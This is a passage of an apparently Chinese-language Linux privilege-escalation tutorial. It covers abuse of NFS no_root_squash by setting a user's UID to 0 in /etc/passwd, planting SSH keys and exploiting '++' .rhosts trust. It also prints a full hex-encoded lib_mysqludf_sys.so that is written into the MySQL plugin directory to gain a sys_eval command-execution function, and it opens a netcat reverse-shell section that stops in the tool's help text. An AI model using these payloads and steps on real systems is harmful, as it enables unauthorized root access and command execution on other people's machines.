<p>从挂载的文件夹执行su命令，并使用之前创建的已知密码，此时当前用户将会被切换到新用户。</p>
<pre><code class="hljs shell">root@kali:/temp# su &lt;name&gt;
Password:</code></pre>

<p>由于该文件的UID与新用户的UID相同，因此系统会误认为这是文件权限的所有者，这样我们就可以以一个合法的用户身份来读取文件的内容了。</p>
<p>之所以造成这种问题，原因在于导出文件夹并未设置root_squash选项。root_squash登入NFS主机，使用该共享目录时相当于该目录的拥有者。但是如果是以root身份使用这个共享目录的时候，那么这个使用者（root）的权限将被压缩成为匿名使用者，即通常他的UID与GID都会变成nobody（root_sqaush参数阻止对连接到NFS卷的远程root用户具有root访问权限，远程根用户在连接时会分配一个用户“ nfsnobody ”，它具有最少的本地特权。如果 no_<em>root_squash</em> 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用“ <em>root_squash</em> ”参数。）那个身份，以防止越权访问。</p>
<p>可以在以下位置启用或禁用root_squash选项：<code>vi /etc/exports</code></p>
<pre><code class="hljs shell">/home 192.168.1.47(root_squash) // Enables Root Squash
/home 192.168.1.47(no_root_squash) // Disables Root Squash</code></pre>

<p>如果/etc/passwd文件在里面且具有写入权限，那么我们可以通过将一些非特权用户的UID更改为0，使其具有根级别的访问权限。从下图中可以看到，我将service用户的UID修改为了0，此时该用户将具备root的访问权限。</p>
<p>通过SSH连接命令再次与目标服务器建立连接，service将获取到一个root访问权限。<code>ssh service@target-ip</code></p>
<h3 id="5-进一步提权"><a href="#5-进一步提权" class="headerlink" title="5.进一步提权"></a>5.进一步提权</h3><p>根据存储在导出文件夹中的文件，可能可以通过SSH或RSH和Rlogin来获取到shell访问权限。 我们着重来关注以下两个文件：</p>
<pre><code class="hljs shell">authorized_keys
rhosts</code></pre>

<p>这两个文件都隐藏在NFS文件夹中，我们可以利用以下命令来确定这些文件的存在:<code>ls -al</code></p>
<p>生成一个SSH密钥对并将其公钥添加到授权密钥列表中，那样我们就可以通过NFS服务器上的SSH与其建立连接了。</p>
<pre><code class="hljs shell">root@kali:cd /root/.ssh/
ssh-keygen -t rsa -b 4096cp /root/.ssh/id_rsa.pub /temp/root/.ssh/
cat id_rsa.pub &gt;&gt; /temp/root/.ssh/authorized_keys
ssh -i /root/.ssh/id_rsa root@target-ip</code></pre>

<p>.rhosts文件用来配置哪些远程主机或用户可以访问系统上的本地帐户。如果.rhosts文件的内容为++符号，则说明它允许来自网络上的任何主机和用户的连接。</p>
<pre><code class="hljs shell">cat .rhosts
++</code></pre>

<p>以下命令将允许系统的root用户直接连接目标系统，系统将不会提示密码输入，因为来自系统的所有用户都将被信任。</p>
<pre><code class="hljs shell">rsh -l root target-ip
rlogin -l root target-ip</code></pre>

<p>或者如果.rhosts的内容不同，则检查文件将有助于确定哪些主机和用户是可信的，因此可以在无需密码的情况下进行身份验证。</p>
<p>另外一个小工具可以省不少事：<a target="_blank" rel="noopener" href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p>
<h2 id="13-’-’路径配置错误"><a href="#13-’-’路径配置错误" class="headerlink" title="13.’.’路径配置错误"></a>13.’.’路径配置错误</h2><p>这个俺没搞懂，迷迷糊糊的，自己看吧：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p>
<h2 id="14-MYSQL数据库提权"><a href="#14-MYSQL数据库提权" class="headerlink" title="14.MYSQL数据库提权"></a>14.MYSQL数据库提权</h2><h3 id="1-UDF提权"><a href="#1-UDF提权" class="headerlink" title="1.UDF提权"></a>1.UDF提权</h3><p>不需要判断mysql是什么版本的，直接查看路径就行，直接写so文件，linux里面的文件是so文件，Windows文件是dll文件。</p>
<p>我们getshell之后进入终端输入whoami，发现我们只是apache用户权限，我们找一下网站数据库的配置文件，运气好的话查看数据库的账号密码，可以看到账号密码（运气不好就say goodbye，或者进phpmyadmin瞅瞅，或者找到mysql/data/mysql/user.MYD，用enjoy c32asm将其密码账号hex出来）</p>
<p>登陆mysql数据库，可以在MySQL里输入<code>show variables like ‘%plugin%’; </code>直接查看plugin路径</p>
<p>然后我们把so文件利用16进制编辑工具进行编码，再解码写入plugin目录中,返回为true，写入成功。</p>
<p>关于so文件来源：<a target="_blank" rel="noopener" href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a>  </p>
<p>下载后解压编译：<code>gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</code></p>
<p>编译时可能会报错：<code>error:my_compiler.h:No such file or directory</code>,这是一个mysql的bug引起的错误，只要修改/usr/include/mysql/my_global.h文件，注释掉626行重新编译就可以了。生成文件lib_mysqludf_sys.so后，使用Hex.hta获取16进制,我已经将转为16进制的so文件放下面了，自取。</p>
<pre><code class="hljs mysql">select unhex(&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#39;) into dumpfile &#39;&#x2F;path_plugin&#x2F;xxx.so&#39;;</code></pre>

<p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限的。</p>
<pre><code class="hljs mysql">create function sys_eval returns string &#39;xxx.so&#39;;</code></pre>

<p>sys_eval这个函数就可以执行系统命令，括号里输入系统命令即可</p>
<pre><code class="hljs mysql">select sys_eval(&#39;whoami&#39;)</code></pre>

<p>另外也可以用sqlmap提权，详情参考windows提权总结的数据库提权</p>
<h2 id="15-反弹shell"><a href="#15-反弹shell" class="headerlink" title="15.反弹shell"></a>15.反弹shell</h2><p>我们已经得到主机的一个webshell,我们想获取一个可以直接操作主机的虚拟终端 </p>
<h3 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h3><p>目标具有公网ip，可以连接外网。由于各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e这里都被阉割了，所以我们需要自己上传一个netcat；或者手动下载二进制安装包，具体如下：</p>
<pre><code class="hljs vim"><span class="hljs-number">1</span>.wget http<span class="hljs-variable">s:</span>//nchc.<span class="hljs-keyword">dl</span>.sourceforge.net/project/netcat/netcat/<span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>/netcat-<span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>.tar.gz   #下载二进制netc安装包
<span class="hljs-number">2</span>.tar -xvzf netcat-<span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>.tar.gz  #解压安装包
<span class="hljs-number">3</span>../configure  #编译安装
<span class="hljs-number">4</span>.<span class="hljs-keyword">make</span>
<span class="hljs-number">5</span>.<span class="hljs-keyword">make</span> install
<span class="hljs-number">6</span>.<span class="hljs-keyword">make</span> clean
<span class="hljs-number">7</span>.nc -h   #查看是否安装成功，出现以下就代表安装成功
GNU netcat <span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>, <span class="hljs-keyword">a</span> rewrite of the famous networking tool.
Basic usage<span class="hljs-variable">s:</span>
connect <span class="hljs-keyword">to</span> somewhere:  nc [<span class="hljs-keyword">options</span>] <span class="hljs-built_in">hostname</span> port [port] ...
listen <span class="hljs-keyword">for</span> inbound:    nc -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">p</span> port [<span class="hljs-keyword">options</span>] [<span class="hljs-built_in">hostname</span>] [port] ...
tunnel <span class="hljs-keyword">to</span> somewhere:   nc -L <span class="hljs-built_in">hostname</span>:port -<span class="hljs-keyword">p</span> port [<span class="hljs-keyword">options</span>]
Mandatory arguments <span class="hljs-keyword">to</span> long <span class="hljs-keyword">options</span> are mandatory <span class="hljs-keyword">for</span> short <span class="hljs-keyword">options</span> too.
Option<span class="hljs-variable">s:</span>
  -<span class="hljs-keyword">c</span>, --<span class="hljs-keyword">close</span>                <span class="hljs-keyword">close</span> connection <span class="hljs-keyword">on</span> EOF from stdin
  -<span class="hljs-keyword">e</span>, --exec=PROGRAM         program <span class="hljs-keyword">to</span> exec after connect
  -g, --gateway=LIST         <span class="hljs-keyword">source</span>-routing hop point[s], <span class="hljs-keyword">up</span> <span class="hljs-keyword">to</span> <span class="hljs-number">8</span>
  -G, --pointer=NUM          <span class="hljs-keyword">source</span>-routing pointer: <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, ...
  -h, --<span class="hljs-keyword">help</span>                 <span class="hljs-keyword">display</span> this <span class="hljs-keyword">help</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>
  -i, --interval=SECS        delay interval <span class="hljs-keyword">for</span> lines sent, ports scanned
  -<span class="hljs-keyword">l</span>, --listen               listen <span class="hljs-keyword">mode</span>, <span class="hljs-keyword">for</span> inbound connects
  -L, --tunnel=ADDRESS:PORT  forward local port <span class="hljs-keyword">to</span> remote address
  -n, --dont-<span class="hljs-built_in">resolve</span>         numeric-<span class="hljs-keyword">only</span> IP addresses, <span class="hljs-keyword">no</span> DNS
  -<span class="hljs-keyword">o</span>, --output=FILE          output hexdump traffic <span class="hljs-keyword">to</span> FILE (implies -<span class="hljs-keyword">x</span>)
  -<span class="hljs-keyword">p</span>, --local-port=NUM       local port <span class="hljs-keyword">number</span>
  -r, --randomize            randomize local <span class="hljs-built_in">and</span> remote ports
  -s, --<span class="hljs-keyword">source</span>=ADDRESS       local <span class="hljs-keyword">source</span> address (ip <span class="hljs-built_in">or</span> <span class="hljs-built_in">hostname</span>)
  -t, --tcp                  TCP <span class="hljs-keyword">mode</span> (default)
  -T, --telnet               answer using TELNET negotiation
  -<span class="hljs-keyword">u</span>, --udp                  UDP <span class="hljs-keyword">mode</span>
  -v, --<span class="hljs-keyword">verbose</span>              <span class="hljs-keyword">verbose</span> (use twice <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> more <span class="hljs-keyword">verbose</span>)
  -V, --<span class="hljs-keyword">version</span>              output <span class="hljs-keyword">version</span> information <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>
  -<span class="hljs-keyword">x</span>, --hexdump              hexdump incoming <span class="hljs-built_in">and</span> outgoing traffic
  -<span class="hljs-keyword">w</span>, --wait=SECS            timeout <span class="hljs-keyword">for</span> connects <span class="hljs-built_in">and</span> final net reads
